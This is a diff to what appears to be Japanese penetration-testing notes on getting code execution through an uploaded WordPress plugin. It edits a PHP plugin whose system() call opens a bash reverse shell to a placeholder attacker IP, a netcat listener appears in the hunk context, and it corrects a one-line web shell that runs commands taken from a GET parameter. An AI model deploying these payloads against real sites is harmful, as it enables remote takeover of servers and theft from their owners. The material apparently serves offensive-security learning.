@@ -130,7 +130,7 @@ sudo rlwrap nc -lvnp 4444
 	Plugin Name: <プラグイン名>
 	*/
 
-system("bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'");
+system("bash -c 'bash -i >&　/dev/tcp/<attacker_IP>/<Port> 0>&1'");
 ?>
 ```
 - コメント部分は必須で、WordPressがプラグイン名を識別するためのプラグインヘッダーという
@@ -151,7 +151,7 @@ zip <output_name> <file>
 	Plugin Name: <プラグイン名>
 	*/
 
-echo sysetm($_GET["cmd"]); 
+echo system($_GET["cmd"]);
 ?>
 ```
 
